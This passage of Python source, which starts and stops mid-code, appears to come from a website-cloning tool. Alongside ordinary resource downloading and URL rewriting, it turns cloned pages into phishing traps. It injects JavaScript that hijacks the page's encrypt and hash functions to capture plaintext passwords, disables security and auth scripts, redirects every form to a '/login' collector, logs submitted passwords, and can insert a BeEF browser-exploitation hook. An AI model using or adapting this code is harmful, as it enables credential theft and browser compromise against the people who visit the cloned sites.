        # Find service worker registrations in HTML
        sw_urls = set()
        
        # Check for service worker registration scripts
        for script in soup.find_all('script'):
            if script.string:
                # Look for service worker registration patterns
                sw_patterns = [
                    r'navigator\.serviceWorker\.register\s*\(\s*["\']([^"\']+)["\']',
                    r'serviceWorker\.register\s*\(\s*["\']([^"\']+)["\']',
                    r'register\s*\(\s*["\']([^"\']+\.js)["\']'
                ]
                
                for pattern in sw_patterns:
                    matches = re.findall(pattern, script.string, re.IGNORECASE)
                    sw_urls.update(matches)
        
        # Process each service worker
        for sw_url in sw_urls:
            if self._is_valid_resource_url(sw_url, base_url):
                resources.append((sw_url, None, 'src', 'js'))
                
                # Download and parse service worker for additional resources
                try:
                    result = await self.resource_manager.download_resource_universal(
                        self._resolve_url(sw_url, base_url), 'js', base_url
                    )
                    
                    if result:
                        content, metadata = result
                        sw_content = content.decode('utf-8', errors='ignore')
                        
                        # Extract resources from service worker
                        sw_resources = self._extract_resources_from_js(sw_content, base_url)
                        resources.extend(sw_resources)
                        
                        self.resource_manager.stats['service_workers_found'] += 1
                        
                except Exception as e:
                    logger.debug(f"Service worker processing failed: {e}")
        
        return resources
    
    async def _discover_web_manifest_resources(self, soup: BeautifulSoup, base_url: str, output_dir: Path) -> List[Tuple[str, Any, str, str]]:
        """Discover and process web app manifest resources"""
        resources = []
        
        # Find manifest links
        manifest_links = soup.find_all('link', rel='manifest')
        
        for link in manifest_links:
            manifest_url = link.get('href')
            if manifest_url and self._is_valid_resource_url(manifest_url, base_url):
                resources.append((manifest_url, link, 'href', 'json'))
                
                # Download and parse manifest
                try:
                    result = await self.resource_manager.download_resource_universal(
                        self._resolve_url(manifest_url, base_url), 'json', base_url
                    )
                    
                    if result:
                        content, metadata = result
                        manifest_data = json.loads(content.decode('utf-8'))
                        
                        # Extract icon resources
                        for icon in manifest_data.get('icons', []):
                            if icon.get('src'):
                                icon_url = icon['src']
                                if self._is_valid_resource_url(icon_url, base_url):
                                    resources.append((icon_url, None, 'src', 'image'))
                        
                        # Extract screenshot resources
                        for screenshot in manifest_data.get('screenshots', []):
                            if screenshot.get('src'):
                                screenshot_url = screenshot['src']
                                if self._is_valid_resource_url(screenshot_url, base_url):
                                    resources.append((screenshot_url, None, 'src', 'image'))
                        
                        self.resource_manager.stats['manifests_found'] += 1
                        
                except Exception as e:
                    logger.debug(f"Manifest processing failed: {e}")
        
        return resources
    
    def _discover_dynamic_universal_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Discover dynamic resources using universal patterns"""
        resources = []
        
        # Universal URL patterns that might contain resources
        url_patterns = [
            r'https?://[^\s<>"\'()]+\.(png|jpg|jpeg|gif|svg|webp|avif|css|js|woff|woff2|ttf|otf|mp4|mp3|wav)',
            r'["\']([^"\']*\.(png|jpg|jpeg|gif|svg|webp|avif|css|js|woff|woff2|ttf|otf|mp4|mp3|wav))["\']',
            r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)',
            r'src\s*[:=]\s*["\']([^"\']+)["\']',
            r'href\s*[:=]\s*["\']([^"\']+)["\']'
        ]
        
        # Search in all text content
        page_text = soup.get_text()
        for pattern in url_patterns:
            matches = re.findall(pattern, page_text, re.IGNORECASE)
            for match in matches:
                url = match[0] if isinstance(match, tuple) else match
                if self._is_valid_resource_url(url, base_url):
                    resource_type = self._detect_universal_resource_type(url)
                    resources.append((url, None, 'dynamic', resource_type))
        
        # Search in all script contents
        for script in soup.find_all('script'):
            if script.string:
                script_resources = self._extract_resources_from_js(script.string, base_url)
                resources.extend(script_resources)
        
        return resources
    
    def _discover_css_inline_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Discover resources in CSS (inline styles and style tags)"""
        resources = []
        
        # Process inline style attributes
        for element in soup.find_all(style=True):
            style_content = element.get('style', '')
            css_urls = self._extract_urls_from_css(style_content, base_url)
            for url in css_urls:
                resource_type = self._detect_universal_resource_type(url)
                resources.append((url, element, 'style', resource_type))
        
        # Process style tags
        for style_tag in soup.find_all('style'):
            if style_tag.string:
                css_urls = self._extract_urls_from_css(style_tag.string, base_url)
                for url in css_urls:
                    resource_type = self._detect_universal_resource_type(url)
                    resources.append((url, style_tag, 'content', resource_type))
        
        return resources
    
    def _discover_js_embedded_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Discover resources embedded in JavaScript"""
        resources = []
        
        for script in soup.find_all('script'):
            if script.string:
                js_resources = self._extract_resources_from_js(script.string, base_url)
                resources.extend([(url, script, 'js-embedded', res_type) for url, res_type in js_resources])
        
        return resources
    
    def _discover_svg_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Discover SVG-specific resources"""
        resources = []
        
        # Inline SVG resources
        for svg in soup.find_all('svg'):
            # Image references in SVG
            for image in svg.find_all('image'):
                for attr in ['href', 'xlink:href']:
                    url = image.get(attr)
                    if url and self._is_valid_resource_url(url, base_url):
                        resources.append((url, image, attr, 'image'))
            
            # Use elements with external references
            for use in svg.find_all('use'):
                for attr in ['href', 'xlink:href']:
                    url = use.get(attr)
                    if url and url.startswith('http') and self._is_valid_resource_url(url, base_url):
                        resources.append((url, use, attr, 'svg'))
            
            # Pattern and filter references
            for elem in svg.find_all(['pattern', 'filter', 'defs']):
                for child in elem.find_all(True):
                    for attr in ['href', 'xlink:href']:
                        url = child.get(attr)
                        if url and self._is_valid_resource_url(url, base_url):
                            resources.append((url, child, attr, 'svg'))
        
        return resources
    
    def _extract_font_face_urls(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Extract font URLs from @font-face declarations"""
        resources = []
        
        for style_tag in soup.find_all('style'):
            if style_tag.string:
                # Find @font-face rules
                font_face_pattern = r'@font-face\s*{[^}]*}'
                font_faces = re.findall(font_face_pattern, style_tag.string, re.IGNORECASE | re.DOTALL)
                
                for font_face in font_faces:
                    # Extract src URLs
                    url_pattern = r'src:\s*url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)'
                    urls = re.findall(url_pattern, font_face, re.IGNORECASE)
                    
                    for url in urls:
                        if self._is_valid_resource_url(url, base_url):
                            resources.append((url, style_tag, 'font-face', 'font'))
        
        return resources
    
    def _extract_urls_from_css(self, css_content: str, base_url: str) -> List[str]:
        """Extract all URLs from CSS content"""
        urls = []
        
        # CSS URL patterns
        patterns = [
            r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)',
            r'@import\s+["\']([^"\']+)["\']',
            r'@import\s+url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, css_content, re.IGNORECASE)
            for match in matches:
                if self._is_valid_resource_url(match, base_url):
                    absolute_url = self._resolve_url(match, base_url)
                    if absolute_url:
                        urls.append(absolute_url)
        
        return urls
    
    def _extract_resources_from_js(self, js_content: str, base_url: str) -> List[Tuple[str, str]]:
        """Extract resource URLs from JavaScript content"""
        resources = []
        
        # Enhanced JavaScript URL patterns
        patterns = [
            # Standard file extensions
            r'["\']([^"\']*\.(png|jpg|jpeg|gif|svg|webp|avif|css|js|woff|woff2|ttf|otf|mp4|mp3|wav|ico))["\']',
            
            # Dynamic resource patterns
            r'["\']([^"\']*\/[^"\']*\?[^"\']*\.(png|jpg|jpeg|gif|svg|webp|avif|css|js|woff|woff2|ttf|otf))["\']',
            
            # Object properties
            r'(?:src|url|href|image|background|icon)\s*[:=]\s*["\']([^"\']+)["\']',
            
            # Import/require statements
            r'(?:import|require)\s*\(\s*["\']([^"\']+)["\']',
            
            # Template literals
            r'`([^`]*\.(png|jpg|jpeg|gif|svg|webp|avif|css|js|woff|woff2|ttf|otf|mp4|mp3|wav))`',
            
            # Webpack/bundle patterns
            r'__webpack_public_path__\s*\+\s*["\']([^"\']+)["\']',
            r'webpackJsonp\([^)]*\)\(\[\],{[^}]*"([^"]*\.(js|css))"',
            
            # Modern JS patterns
            r'new\s+URL\s*\(\s*["\']([^"\']+)["\']',
            r'fetch\s*\(\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                url = match[0] if isinstance(match, tuple) else match
                
                # Skip very short URLs or obvious non-resources
                if len(url) < 4 or url.startswith(('#', 'data:', 'blob:', 'javascript:')):
                    continue
                
                if self._is_valid_resource_url(url, base_url):
                    absolute_url = self._resolve_url(url, base_url)
                    if absolute_url:
                        resource_type = self._detect_universal_resource_type(absolute_url)
                        resources.append((absolute_url, resource_type))
        
        return resources
    
    def _parse_srcset(self, srcset: str) -> List[str]:
        """Parse srcset attribute to extract URLs"""
        urls = []
        # srcset format: "url1 descriptor1, url2 descriptor2, ..."
        entries = srcset.split(',')
        for entry in entries:
            entry = entry.strip()
            # URL is the first part before any whitespace
            url = entry.split()[0] if entry.split() else entry
            if url:
                urls.append(url)
        return urls
    
    def _detect_universal_resource_type(self, url: str) -> str:
        """Universal resource type detection for any file"""
        url_lower = url.lower()
        
        # Image types
        if any(ext in url_lower for ext in ['.png', '.jpg', '.jpeg', '.gif', '.webp', '.avif', '.bmp', '.ico']):
            return 'image'
        elif '.svg' in url_lower:
            return 'svg'
        
        # Document types
        elif any(ext in url_lower for ext in ['.css']):
            return 'css'
        elif any(ext in url_lower for ext in ['.js', '.mjs', '.jsx', '.ts', '.tsx']):
            return 'js'
        
        # Font types
        elif any(ext in url_lower for ext in ['.woff', '.woff2', '.ttf', '.otf', '.eot']):
            return 'font'
        
        # Media types
        elif any(ext in url_lower for ext in ['.mp4', '.webm', '.avi', '.mov', '.wmv']):
            return 'video'
        elif any(ext in url_lower for ext in ['.mp3', '.wav', '.ogg', '.aac', '.flac']):
            return 'audio'
        
        # Document types
        elif any(ext in url_lower for ext in ['.pdf', '.doc', '.docx', '.txt']):
            return 'document'
        elif any(ext in url_lower for ext in ['.json', '.xml', '.manifest']):
            return 'data'
        
        # Default
        return 'asset'
    
    def _map_as_to_resource_type(self, as_value: str) -> Optional[str]:
        """Map preload 'as' attribute to resource type"""
        mapping = {
            'style': 'css',
            'script': 'js',
            'image': 'image',
            'font': 'font',
            'video': 'video',
            'audio': 'audio',
            'document': 'document',
            'fetch': 'data'
        }
        return mapping.get(as_value.lower())
    
    def _is_valid_resource_url(self, url: str, base_url: str) -> bool:
        """Universal URL validation for any website"""
        if not url or len(url) < 4:
            return False
        
        # Skip non-resource URLs
        if url.startswith(('data:', 'blob:', 'javascript:', 'mailto:', 'tel:', '#')):
            return False
        
        # Skip URLs that are just fragments or anchors
        if url.startswith('#') or url == '/':
            return False
        
        # Allow all domains by default (universal approach)
        # Only skip obvious CDNs that shouldn't be cloned
        skip_domains = [
            'fonts.googleapis.com', 
            'fonts.gstatic.com',
            'cdnjs.cloudflare.com',
            'ajax.googleapis.com',
            'code.jquery.com',
            'stackpath.bootstrapcdn.com',
            'maxcdn.bootstrapcdn.com',
            'unpkg.com',
            'jsdelivr.net'
        ]
        
        try:
            if url.startswith('//'):
                scheme = urllib.parse.urlparse(base_url).scheme
                url = f"{scheme}:{url}"
            elif not url.startswith(('http://', 'https://')):
                return True  # Relative URLs are always valid
            
            parsed = urllib.parse.urlparse(url)
            
            # Skip known external CDNs only
            if any(domain in parsed.netloc for domain in skip_domains):
                return False
            
            return True
            
        except Exception:
            return False
    
    def _resolve_url(self, url: str, base_url: str) -> Optional[str]:
        """Universal URL resolution"""
        try:
            if not url or url.startswith(('data:', 'blob:', 'javascript:')):
                return None
            
            if url.startswith('//'):
                scheme = urllib.parse.urlparse(base_url).scheme
                return f"{scheme}:{url}"
            elif not url.startswith(('http://', 'https://')):
                return urllib.parse.urljoin(base_url, url)
            else:
                return url
        except Exception:
            return None
    
    def _deduplicate_resources(self, resources: List[Tuple[str, Any, str, str]]) -> List[Tuple[str, Any, str, str]]:
        """Remove duplicate resources while preserving order"""
        seen = set()
        unique = []
        
        for resource in resources:
            url = resource[0]
            if url not in seen:
                seen.add(url)
                unique.append(resource)
        
        return unique
    
    async def _process_universal_resource(self, semaphore: asyncio.Semaphore, resource_url: str, 
                                        element: Any, attr: str, resource_type: str, 
                                        base_url: str, output_dir: Path):
        """Process a single resource universally"""
        async with semaphore:
            try:
                # Resolve URL
                absolute_url = self._resolve_url(resource_url, base_url)
                if not absolute_url:
                    return None
                
                # Download resource
                result = await self.resource_manager.download_resource_universal(
                    absolute_url, resource_type, base_url
                )
                
                if result:
                    content, metadata = result
                    
                    # Save resource
                    local_path = await self._save_universal_resource(
                        content, metadata, resource_type, output_dir
                    )
                    
                    if local_path:
                        # Store mapping for URL rewriting
                        self.resource_manager.url_mappings[absolute_url] = local_path
                        if resource_url != absolute_url:
                            self.resource_manager.url_mappings[resource_url] = local_path
                        
                        # Update element reference if applicable
                        if element and attr in ['src', 'href'] and hasattr(element, 'attrs'):
                            element[attr] = local_path
                        
                        return local_path
                
                return None
                
            except Exception as e:
                logger.debug(f"Universal resource processing failed for {resource_url}: {e}")
                return None
    
    async def _save_universal_resource(self, content: bytes, metadata: Dict[str, Any], 
                                     resource_type: str, output_dir: Path) -> Optional[str]:
        """Universal resource saving with proper handling"""
        try:
            url = metadata.get('url', '')
            content_type = metadata.get('content_type', '')
            
            # Generate safe filename
            filename = self._generate_safe_filename(url, content_type, resource_type)
            subdir = self._get_resource_subdir(resource_type)
            
            # Create directory and file path
            resource_dir = output_dir / subdir
            resource_dir.mkdir(exist_ok=True)
            file_path = resource_dir / filename
            local_path = f"{subdir}/{filename}"
            
            # Save content based on type
            if self._is_text_resource(resource_type, content_type):
                # Text resources
                try:
                    text_content = content.decode('utf-8', errors='ignore')
                    
                    # Process CSS imports recursively
                    if resource_type == 'css':
                        text_content = await self._process_css_imports_recursive(
                            text_content, url, output_dir
                        )
                    
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(text_content)
                        
                except Exception as e:
                    logger.debug(f"Text save failed, trying binary: {e}")
                    with open(file_path, 'wb') as f:
                        f.write(content)
            else:
                # Binary resources
                with open(file_path, 'wb') as f:
                    f.write(content)
            
            # Verify save
            if file_path.exists() and file_path.stat().st_size > 0:
                logger.debug(f"Saved universal resource: {local_path}")
                return local_path
            
            return None
            
        except Exception as e:
            logger.debug(f"Universal resource save failed: {e}")
            return None
    
    async def _process_css_imports_recursive(self, css_content: str, css_url: str, 
                                           output_dir: Path) -> str:
        """Process CSS @import statements recursively"""
        
        # Avoid infinite recursion
        if css_url in self.resource_manager.processed_css_imports:
            return css_content
        
        self.resource_manager.processed_css_imports.add(css_url)
        
        # Find @import statements
        import_pattern = r'@import\s+(?:url\s*\(\s*)?["\']?([^"\'();\s]+)["\']?\s*\)?[^;]*;'
        
        def process_import(match):
            import_url = match.group(1)
            
            if self._is_valid_resource_url(import_url, css_url):
                absolute_import_url = self._resolve_url(import_url, css_url)
                
                if absolute_import_url and absolute_import_url not in self.resource_manager.processed_css_imports:
                    # Download imported CSS
                    try:
                        result = self.resource_manager.download_resource_universal(
                            absolute_import_url, 'css', css_url
                        )
                        
                        # This would need to be handled differently in real async context
                        # For now, return the modified import statement
                        local_path = f"css/imported_{hashlib.md5(absolute_import_url.encode()).hexdigest()[:8]}.css"
                        return f'@import url("{local_path}");'
                        
                    except Exception:
                        pass
            
            return match.group(0)
        
        return re.sub(import_pattern, process_import, css_content, flags=re.IGNORECASE)
    
    def _generate_safe_filename(self, url: str, content_type: str, resource_type: str) -> str:
        """Generate a safe filename for any resource"""
        try:
            parsed = urllib.parse.urlparse(url)
            
            # Try to use original filename if reasonable
            if parsed.path and len(parsed.path) > 1:
                original_name = os.path.basename(parsed.path)
                if original_name and len(original_name) < 100 and not original_name.startswith('.'):
                    # Clean the filename
                    safe_name = re.sub(r'[^\w\-._]', '_', original_name)
                    if safe_name and not safe_name.startswith('_'):
                        return safe_name
            
            # Generate filename from URL hash
            url_hash = hashlib.sha256(url.encode()).hexdigest()[:16]
            extension = self._get_file_extension(url, content_type, resource_type)
            
            return f"resource_{url_hash}{extension}"
            
        except Exception:
            # Fallback to simple hash
            url_hash = hashlib.md5(url.encode()).hexdigest()[:12]
            extension = self._get_file_extension(url, content_type, resource_type)
            return f"res_{url_hash}{extension}"
    
    def _get_file_extension(self, url: str, content_type: str, resource_type: str) -> str:
        """Get appropriate file extension"""
        
        # Try URL extension first
        try:
            parsed = urllib.parse.urlparse(url)
            if parsed.path:
                _, ext = os.path.splitext(parsed.path)
                if ext and len(ext) <= 6 and ext.startswith('.'):
                    return ext
        except Exception:
            pass
        
        # Content type mapping
        type_extensions = {
            'text/css': '.css',
            'text/javascript': '.js',
            'application/javascript': '.js',
            'application/x-javascript': '.js',
            'image/jpeg': '.jpg',
            'image/jpg': '.jpg',
            'image/png': '.png',
            'image/gif': '.gif',
            'image/svg+xml': '.svg',
            'image/webp': '.webp',
            'image/avif': '.avif',
            'font/woff': '.woff',
            'font/woff2': '.woff2',
            'application/font-woff': '.woff',
            'application/font-woff2': '.woff2',
            'font/ttf': '.ttf',
            'font/otf': '.otf',
            'video/mp4': '.mp4',
            'video/webm': '.webm',
            'audio/mp3': '.mp3',
            'audio/wav': '.wav',
            'application/json': '.json',
            'application/xml': '.xml'
        }
        
        if content_type:
            base_type = content_type.split(';')[0].strip().lower()
            if base_type in type_extensions:
                return type_extensions[base_type]
        
        # Resource type fallbacks
        type_fallbacks = {
            'css': '.css',
            'js': '.js',
            'image': '.jpg',
            'svg': '.svg',
            'font': '.woff',
            'video': '.mp4',
            'audio': '.mp3',
            'json': '.json'
        }
        
        return type_fallbacks.get(resource_type, '.bin')
    
    def _get_resource_subdir(self, resource_type: str) -> str:
        """Get subdirectory for resource type"""
        subdirs = {
            'css': 'css',
            'js': 'js',
            'image': 'images',
            'svg': 'images',
            'font': 'fonts',
            'video': 'videos',
            'audio': 'audio',
            'document': 'documents',
            'data': 'data'
        }
        return subdirs.get(resource_type, 'assets')
    
    def _is_text_resource(self, resource_type: str, content_type: str) -> bool:
        """Determine if resource should be treated as text"""
        text_types = ['css', 'js', 'json', 'xml', 'svg']
        if resource_type in text_types:
            return True
        
        if content_type:
            text_content_types = ['text/', 'application/javascript', 'application/json', 'application/xml', 'image/svg+xml']
            return any(content_type.lower().startswith(t) for t in text_content_types)
        
        return False
    
    def _rewrite_universal_urls(self, soup: BeautifulSoup, base_url: str):
        """Universal URL rewriting after resource processing"""
        
        # Rewrite URLs in style attributes
        for element in soup.find_all(style=True):
            original_style = element.get('style', '')
            if original_style:
                new_style = self._rewrite_css_urls(original_style, base_url)
                if new_style != original_style:
                    element['style'] = new_style
        
        # Rewrite URLs in style tags
        for style_tag in soup.find_all('style'):
            if style_tag.string:
                original_css = style_tag.string
                new_css = self._rewrite_css_urls(original_css, base_url)
                if new_css != original_css:
                    style_tag.string = new_css
        
        # Rewrite direct src/href attributes that weren't updated during processing
        for element in soup.find_all(['img', 'script', 'link', 'source']):
            for attr in ['src', 'href']:
                if element.get(attr):
                    original_url = element[attr]
                    absolute_url = self._resolve_url(original_url, base_url)
                    if absolute_url and absolute_url in self.resource_manager.url_mappings:
                        element[attr] = self.resource_manager.url_mappings[absolute_url]
    
    def _rewrite_css_urls(self, css_text: str, base_url: str) -> str:
        """Rewrite URLs in CSS text"""
        
        def replace_url(match):
            original_url = match.group(1).strip('\'"')
            absolute_url = self._resolve_url(original_url, base_url)
            
            # Check mappings
            if absolute_url and absolute_url in self.resource_manager.url_mappings:
                local_path = self.resource_manager.url_mappings[absolute_url]
                return f'url("{local_path}")'
            elif original_url in self.resource_manager.url_mappings:
                local_path = self.resource_manager.url_mappings[original_url]
                return f'url("{local_path}")'
            
            return match.group(0)
        
        return re.sub(r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)', replace_url, css_text)
    
    def _inject_universal_password_capture_html(self, soup: BeautifulSoup):
        """Inject universal password capture into HTML"""
        ultra_script = soup.new_tag('script')
        ultra_script.string = '''(function() {
            if (window.universalCaptureLoaded) return;
            window.universalCaptureLoaded = true;
            console.log("🔑 UNIVERSAL HTML Password Capture Loaded");
            
            window.universalPasswordData = {passwords: [], usernames: []};
            
            // Universal encryption blocking
            const killEncryption = ['encrypt', 'hash', 'md5', 'sha1', 'sha256', 'PWDEncrypt', 'encryptPassword'];
            killEncryption.forEach(func => {
                try {
                    Object.defineProperty(window, func, {
                        get: () => (p) => { 
                            console.log(`🔑 KILLED ${func}:`, p);
                            window.universalPasswordData.passwords.push({field: func, password: p, time: Date.now()});
                            return p;
                        },
                        set: () => {},
                        configurable: false
                    });
                } catch(e) {}
            });
            
            console.log("✅ Universal password capture ready");
        })();'''
        
        head = soup.find('head')
        if head:
            head.insert(0, ultra_script)
        else:
            # Create head if missing
            head = soup.new_tag('head')
            head.append(ultra_script)
            if soup.html:
                soup.html.insert(0, head)
    
    def _disable_universal_encryption_scripts(self, soup: BeautifulSoup):
        """Remove/disable encryption scripts universally"""
        
        removed_count = 0
        encryption_patterns = [
            'encrypt', 'crypto', 'hash', 'md5', 'sha', 'pwd', 'password',
            'security', 'auth', 'login', 'sign'
        ]
        
        for script in soup.find_all('script'):
            if script.string:
                script_lower = script.string.lower()
                
                # Check for encryption patterns
                if any(pattern in script_lower for pattern in encryption_patterns):
                    # Replace with dummy script
                    script.string = f'/* REMOVED ENCRYPTION SCRIPT */ console.log("Script disabled for security");'
                    removed_count += 1
            
            # Remove suspicious external scripts
            src = script.get('src', '').lower()
            if src and any(pattern in src for pattern in ['crypto', 'encrypt', 'security', 'auth']):
                script.decompose()
                removed_count += 1
        
        logger.debug(f"Disabled {removed_count} potential encryption scripts")
    
    def _remove_universal_tracking_scripts(self, soup: BeautifulSoup):
        """Remove tracking scripts from any website"""
        
        tracking_patterns = [
            'google-analytics', 'googletagmanager', 'gtag', 'ga.js',
            'facebook.net', 'connect.facebook', 'fbevents', 'fbq',
            'doubleclick', 'googlesyndication', 'adsystem',
            'hotjar', 'fullstory', 'logrocket', 'mixpanel',
            'segment.com', 'amplitude', 'intercom'
        ]
        
        removed_count = 0
        
        for script in soup.find_all(['script', 'iframe', 'img']):
            src = script.get('src', '').lower()
            if src and any(pattern in src for pattern in tracking_patterns):
                script.decompose()
                removed_count += 1
        
        logger.debug(f"Removed {removed_count} tracking elements")
    
    def _process_universal_forms(self, soup: BeautifulSoup):
        """Universal form processing for any website"""
        
        for form in soup.find_all('form'):
            # Store original action
            original_action = form.get('action', '')
            if original_action:
                form['data-original-action'] = original_action
            
            # Redirect all forms to login handler
            form['action'] = '/login'
            form['method'] = 'post'
            
            # Enhance all password fields
            for input_field in form.find_all('input'):
                input_type = (input_field.get('type') or '').lower()
                input_name = (input_field.get('name') or input_field.get('id') or '').lower()
                
                if input_type == 'password' or any(keyword in input_name for keyword in ['pass', 'pwd', 'secret']):
                    input_field['data-universal-password'] = 'true'
                    input_field['autocomplete'] = 'new-password'
                    
                    # Remove encryption attributes
                    for attr in ['data-encrypt', 'data-hash', 'onchange', 'onblur', 'oninput']:
                        if input_field.get(attr):
                            del input_field[attr]
    
    def _add_beef_hook(self, soup: BeautifulSoup):
        """Add BeEF hook if enabled"""
        script = soup.new_tag('script')
        script['src'] = 'http://localhost:3000/hook.js'
        
        body = soup.find('body')
        if body:
            body.append(script)
    
    def _add_universal_ajax_blocking(self, soup: BeautifulSoup):
        """Universal AJAX blocking for any website"""
        script = soup.new_tag('script')
        script.string = '''
        (function() {
            const blockedPatterns = [
                '/api/', '/ajax/', '/graphql', '/rpc/', '/websocket',
                '/analytics/', '/tracking/', '/metrics/', '/telemetry/',
                '/beacon/', '/collect/', '/report/', '/log/', '/ping'
            ];
            
            // Block XMLHttpRequest
            if (window.XMLHttpRequest) {
                const originalOpen = XMLHttpRequest.prototype.open;
                XMLHttpRequest.prototype.open = function(method, url) {
                    if (typeof url === 'string' && blockedPatterns.some(p => url.includes(p))) {
                        console.log('🛡️ Universal blocked AJAX:', url);
                        this.readyState = 4;
                        this.status = 200;
                        this.responseText = '{}';
                        setTimeout(() => {
                            if (this.onload) this.onload();
                            if (this.onreadystatechange) this.onreadystatechange();
                        }, 10);
                        return;
                    }
                    return originalOpen.apply(this, arguments);
                };
            }
            
            // Block fetch
            if (window.fetch) {
                const originalFetch = window.fetch;
                window.fetch = function(url, options) {
                    if (typeof url === 'string' && blockedPatterns.some(p => url.includes(p))) {
                        console.log('🛡️ Universal blocked fetch:', url);
                        return Promise.resolve(new Response('{}', {status: 200}));
                    }
                    return originalFetch.apply(this, arguments).catch(() => 
                        new Response('{}', {status: 200})
                    );
                };
            }
            
            console.log('🛡️ Universal AJAX blocking active');
        })();
        '''
        
        head = soup.find('head')
        if head:
            head.insert(0, script)
    
    def _add_universal_js_enhancements(self, soup: BeautifulSoup):
        """Add universal JavaScript enhancements"""
        script = soup.new_tag('script')
        script.string = '''
        (function() {
            // Universal form handling
            document.addEventListener('DOMContentLoaded', function() {
                document.querySelectorAll('form').forEach(function(form) {
                    form.addEventListener('submit', function(e) {
                        this.action = '/login';
                        this.method = 'post';
                    });
                });
            });
            
            // Universal error handling
            window.addEventListener('error', function(e) {
                console.log('🛡️ Universal error handled:', e.message);
                return true;
            });
            
            console.log('✅ Universal enhancements loaded');
        })();
        '''
        
        head = soup.find('head')
        if head:
            head.append(script)
    
    def _process_with_regex_universal(self, html_content: str, base_url: str, 
                                    output_dir: Path, beef_enabled: bool) -> str:
        """Universal regex processing fallback"""
        logger.info("Using universal regex fallback")
        
        # Universal form processing
        html_content = re.sub(
            r'(<form[^>]*?)action\s*=\s*["\']([^"\']*)["\']([^>]*>)',
            r'\1action="/login" data-original-action="\2"\3',
            html_content, flags=re.IGNORECASE
        )
        
        # Add universal password capture
        password_script = '''<script>
        (function() {
            console.log("🔑 Universal REGEX Password Capture");
            window.universalData = {passwords: [], usernames: []};
            
            // Kill encryption functions
            ['encrypt', 'hash', 'PWDEncrypt'].forEach(func => {
                try {
                    window[func] = function(p) { 
                        console.log(`🔑 ${func} killed:`, p);
                        window.universalData.passwords.push({field: func, password: p, time: Date.now()});
                        return p; 
                    };
                } catch(e) {}
            });
            
            // Monitor forms
            document.addEventListener('submit', function(e) {
                const form = e.target;
                const data = new FormData(form);
                for (let [key, value] of data.entries()) {
                    if (/pass|pwd|secret/i.test(key) && value) {
                        console.log(`🔑 Universal form password:`, value);
                        window.universalData.passwords.push({field: key, password: value, time: Date.now()});
                    }
                }
            });
            
            console.log("✅ Universal REGEX capture ready");
        })();
        </script>'''
        
        # Insert at beginning of head or body
        if '<head>' in html_content:
            html_content = html_content.replace('<head>', '<head>' + password_script)
        elif '<body>' in html_content:
            html_content = html_content.replace('<body>', '<body>' + password_script)
        else:
            html_content = password_script + html_content
        
        # Add BeEF if enabled
        if beef_enabled:
            beef_script = '<script src="http://localhost:3000/hook.js"></script>'
            html_content = html_content.replace('</body>', beef_script + '</body>')
        
        return html_content

class UniversalCloner:
    """Universal website cloner for ANY website"""
    
    def __init__(self, config: UniversalClonerConfig = None):
        self.config = config or UniversalClonerConfig()
        self.user_agent_manager = UniversalUserAgentManager()
        self.resource_manager = UniversalResourceManager(self.config)
        self.content_processor = UniversalContentProcessor(self.config, self.resource_manager)
        self.browser_manager = UniversalBrowserManager(self.config)
    
    async def clone_website_universal(self, url: str, user_agent: str, beef_enabled: bool = False) -> bool:
        """Universal website cloning for any site"""
        start_time = time.time()
        
        try:
            logger.info(f"🌍 Universal cloning started: {url}")
            
            # Create universal output directory
            output_dir = self._create_universal_output_directory(url, user_agent)
            if not output_dir:
                return False
            
            # Get user agent configuration
            user_agent_data = self.user_agent_manager.get_agent_for_user_agent(user_agent)
            
            # Initialize all components
            await self.resource_manager.initialize_sessions(user_agent_data)
            self.browser_manager.driver = self.browser_manager.initialize_browser(user_agent)
            
            # Get page content with universal handling
            html_content = await self._get_universal_page_content(url)
            if not html_content:
                logger.error("❌ Failed to retrieve universal page content")
                return False
            
            logger.info(f"✅ Universal content retrieved: {len(html_content):,} characters")
            
            # Process with universal content processor
            processed_html = await self.content_processor.process_html_universal(
                html_content, url, output_dir, beef_enabled
            )
            
            # Save main HTML file
            index_path = output_dir / 'index.html'
            async with aiofiles.open(index_path, 'w', encoding='utf-8') as f:
                await f.write(f'<!DOCTYPE html>\n{processed_html}')
            
            # Save universal metadata
            await self._save_universal_metadata(url, output_dir, start_time)
            
            duration = time.time() - start_time
            logger.info(f"🎉 Universal cloning completed in {duration:.2f}s")
            logger.info(f"📊 Universal stats: {self.resource_manager.stats}")
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Universal cloning failed: {e}")
            return False
        
        finally:
            await self._universal_cleanup()
    
    def _create_universal_output_directory(self, url: str, user_agent: str) -> Optional[Path]:
        """Create universal output directory structure"""
        try:
            # Clean identifiers
            safe_agent = re.sub(r'[^\w\-_.]', '_', user_agent)[:50]  # Limit length
            
            parsed_url = urllib.parse.urlparse(url)
            domain = parsed_url.netloc
            safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
            
            # Create universal directory structure
            timestamp = int(time.time())
            output_dir = Path(self.config.output_base) / f"{safe_domain}_{timestamp}" / safe_agent
            output_dir.mkdir(parents=True, exist_ok=True)
            
            # Create universal subdirectories
            universal_subdirs = [
                'css', 'js', 'images', 'fonts', 'videos', 'audio', 
                'documents', 'data', 'assets'
            ]
            
            for subdir in universal_subdirs:
                (output_dir / subdir).mkdir(exist_ok=True)
            
            logger.info(f"📁 Universal output directory: {output_dir}")
            return output_dir
            
        except Exception as e:
            logger.error(f"❌ Failed to create universal output directory: {e}")
            return None
    
    async def _get_universal_page_content(self, url: str) -> Optional[str]:
        """Get page content using universal methods"""
        
        # Try browser rendering first (best for SPAs and dynamic content)
        if self.browser_manager.driver:
            try:
